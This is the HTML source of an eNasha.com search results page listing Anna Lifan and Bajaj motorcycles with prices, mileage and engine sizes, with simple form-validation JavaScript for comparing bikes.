<script language="javascript" src="bikes.js">
</script>
<script>
function SubmitToGenerate(dm){
		var counter=0;
		for(i=0;i<dm.elements.length;i++){
			if(dm.elements[i].name=="comparebike[]"){
				if(dm.elements[i].checked){
					counter++;
					}
			}
		}
		
		if(counter==0){
			alert("Please select bikes for comparision");
			return false;
		}
		else if (counter<2)
		   {
		   alert("Please select at least 2 bikes for comparision");
		   } 
		   //else if(counter>3)
		  // {
		   //document.getElementById(frm).elements[counter].checked=false;
		   //alert("Only 3 cars can be selected for comparision at a time");
		   //}
		else{
			dm.method = "Post";
			dm.action = "bike_comparision.php";
			dm.submit();
		}
	}
	
	function SubmitToCheck(dm)
	{
		var counter=0;
		for(i=0;i<dm.elements.length;i++)
		{
			if(dm.elements[i].name=="comparebike[]")
			{
				if(dm.elements[i].checked)
				{
					counter++;
				}
			}
		}
			//alert(counter);
		if (counter>3)
		   {
			 alert("Only 3 bikes can be selected for comparision at a time");
		   }
		}
</script>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>eNasha.com- Bike Search Result</title>
<link href="main/css/enasha.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
.car-sr-box1 {	background-image: url(main/images/car_sr_box.jpg);
}
.style1 {font-size: 10px; color: #000000; font-family: Arial, Helvetica, sans-serif;}
.style7 {color: #253313; border: 1px solid #A2C86F; background-color: #F5F9F0; font-family: Arial, Helvetica, sans-serif, Tahoma; font-weight: normal;}
-->
</style>
</head>


<body>
<table width="1004" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td bgcolor="#FFFFFF"><table width="1004" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td height="140" background="main/images/main_banner_bg.gif"><table width="1004" border="0" cellspacing="0" cellpadding="0">
<tr></tr>
<tr>
  <td height="140" align="center"><a href="http://www.enasha.com"><img src="jainepal/stepup4_top.jpg" width="1004" height="140" border="0" /></a></td>
</tr>
</table>
</td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td bgcolor="#FFFFFF"><img src="main/images/transdot.gif" width="3" height="1" /></td>
  </tr>
  <tr>
    <td><table width="1004" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="566" valign="top"><table width="546" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td height="17">	</td>
          </tr>
          <tr>
            <td height="18"><span class="body1"><a href="index.php" class="bc-navigation">Home</a> &raquo; <a href="http://www.enasha.com/bikes.php" class="bc-navigation">Bikes</a>
                </span></td>
          </tr>
          <tr>
            <td valign="top">&nbsp;</td>
          </tr>
          <tr>
            <td valign="top"><img src="main/images/transdot.gif" width="3" height="5" /></td>
          </tr>
          <tr>
            <td height="300" valign="top">
			
			<form name="frm1" method="post" >
			<table width="545" cellpadding="0" cellspacing="0">
              <tr>
                <td width="546"><table width="546" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                      <td width="342"><table width="101%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td height="19" class="article-title1">Search Result</td>
                          </tr>
                          <tr>
                            <td align="center" class="photo-caption">
                                [Prev]                                                                <span style="font-family: Verdana, Arial,Helvetica, sans-serif; font-size: 16px">1</span>
                                <a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=2&chk_new_used=&mk=&release_min_year=&release_max_year=
&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=
&min_capacity=&color=&color_tag="> 2 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=3&chk_new_used=&mk=&release_min_year=&release_max_year=
&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=
&min_capacity=&color=&color_tag="> 3 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=4&chk_new_used=&mk=&release_min_year=&release_max_year=
&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=
&min_capacity=&color=&color_tag="> 4 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=5&chk_new_used=&mk=&release_min_year=&release_max_year=
&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=
&min_capacity=&color=&color_tag="> 5 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=6&chk_new_used=&mk=&release_min_year=&release_max_year=
&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=
&min_capacity=&color=&color_tag="> 6 </a>                                <a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=2&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag=">[Next]</a>                                </td>
                          </tr>
                          <tr>
                            <td><span class="car-record-found">Total <span class="car-record-found_no">
                              72                              </span> Records Found. Showing <span class="car-record-found_no">
                              1                              </span> of Total <span class="car-record-found_no">
                              6                              </span> Pages</span>
                                </td>
                          </tr>
                      </table></td>
                      <td width="204" valign="middle"><div align="right"><a href="#" onClick="SubmitToGenerate(document.frm1)"> <img src="main/images/buttn_compare_vehi.jpg" border="0" /></a></div></td>
                    </tr>
                </table></td>
              </tr>
              <tr>
                <td class="photo-caption" align="center"></td>
              </tr>
              <tr>
                <td><table width="545" border="0" cellspacing="0" cellpadding="0">
                    
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Anna Lifan Cool Boy 150 -GY</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=302"><img src="bikedb/bikephoto/annalifan/coolboy150-gy/top/annalifan2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    15.5                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        40                                    -                                    45<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    149.4                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=302"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="Anna LifanCool Boy 150 -GY" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Anna Lifan GN AL 125-7</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=277"><img src="bikedb/bikephoto/annalifan/gnal125-7/top/annalifan2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                                                        </span><span class="car-list-box-body">
                                                                        </span><span class="car-record-found-no-blk">
                                    81.5                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        45                                    -                                    50<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    124.1                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=277"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="Anna LifanGN AL 125-7" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Anna Lifan Street AL 125-J</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=301"><img src="bikedb/bikephoto/annalifan/streetal125-j/top/annalifan2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                                                        </span><span class="car-list-box-body">
                                                                        </span><span class="car-record-found-no-blk">
                                    95.5                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        50                                    -                                    55<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    124.1                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=301"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="Anna LifanStreet AL 125-J" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          <tr>
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Anna Lifan Super R AL 100-9A</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=279"><img src="bikedb/bikephoto/annalifan/superral100-9a/top/annalifan2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                                                        </span><span class="car-list-box-body">
                                                                        </span><span class="car-record-found-no-blk">
                                    69.5                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        50                                    -                                    55<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    97                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=279"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="Anna LifanSuper R AL 100-9A" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Anna Lifan Swastik AL 110-C</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=278"><img src="bikedb/bikephoto/annalifan/swastikal110-c/top/annalifan2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                                                        </span><span class="car-list-box-body">
                                                                        </span><span class="car-record-found-no-blk">
                                    74.5                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        45                                    -                                    50<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    107                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=278"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="Anna LifanSwastik AL 110-C" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj Avenger,DTS-i</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=255"><img src="bikedb/bikephoto/bajaj/avenger,dts-i/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    64                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        30                                    -                                    35<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    180                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=255"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajAvenger,DTS-i" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          <tr>
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj CT 100</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=251"><img src="bikedb/bikephoto/bajaj/ct100/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    4                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        60                                    -                                    65<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    99.27                                   </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=251"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajCT 100" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj Discover125 DTS-i </td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=254"><img src="bikedb/bikephoto/bajaj/discoverdts-i/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    29                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        50                                    -                                    55<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    124.52                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=254"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajDiscover125 DTS-i" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj Kristal DTS-i</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=256"><img src="bikedb/bikephoto/bajaj/kristaldts-i/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    4                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        40                                    -                                    45<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    94.8                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=256"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajKristal DTS-i" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          <tr>
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj Platina</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=257"><img src="bikedb/bikephoto/bajaj/platina/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    10                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        60                                    -                                    65<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    99.27                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=257"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajPlatina" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj Pulsar 150 DTS-i</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=253"><img src="bikedb/bikephoto/bajaj/pulsar150dts-i/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    58                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        40                                    -                                    45<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    149.01                                  </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=253"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajPulsar 150 DTS-i" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                          </tr>
                        </table>
                         
                          
                      <td width="183" height="310"><table width="178"  border="0" cellpadding="0" cellspacing="0" class="article-list-box">
                          <tr>
                            <td width="178" height="286" valign="top"><table width="165" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                                </tr>
                                <tr>
                                  <td width="165" height="32" valign="top" class="car-sr-heading">Bajaj Pulsar 180 DTS-i</td>
                                </tr>
                                <tr>
                                                                    <td height="125"><a href="bike_detail.php?bid=252"><img src="bikedb/bikephoto/bajaj/pulsar180dts-i/top/bajaj2_top.gif" border="0" /></a>
                                                                            </td>
                                </tr>
                                
                                <tr>
                                  <td><span class="style1">Price: </span> <span class="car-record-found-no-blk">
                                    1                                    </span><span class="car-list-box-body">
                                    Lakh                                    </span><span class="car-record-found-no-blk">
                                    66                                    </span><span class="car-list-box-body"> Thou.<br />
                                    <strong>Milage : </strong></span><span class="car-record-found-no-blk">
                                                                        30                                    -                                    35<span class="car-list-box-body"> kmpl </span></span><span class="car-list-box-body"><br />
                                    <strong>Engine:</strong> </span><span class="car-record-found-no-blk">
                                    179.90                                   </span><span class="car-list-box-body"> cc </span></td>
                                </tr>
                                <tr>
                                  <td height="30" class="body1-small"><a href="bike_detail.php?bid=252"><img src="main/images/buttn_more.jpg" width="65" height="19" border="0" /></a></td>
                                </tr>
                                <tr>
                                  <td bgcolor="#EAEAEA" class="body1-small"><table width="165" border="0" cellspacing="1" cellpadding="1">
                                      <tr>
                                        <td bgcolor="#F9F9F9"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                                            <tr>
                                              <td width="24"><div align="center">
                                                  <input type="checkbox" name="comparebike[]" value="BajajPulsar 180 DTS-i" onClick="SubmitToCheck(document.frm1)" />
                                              </div></td>
                                              <td width="131" ><a href="#" class="main" onClick="SubmitToGenerate(document.frm1)">Check &nbsp;for Comparision</a> </td>
                                            </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
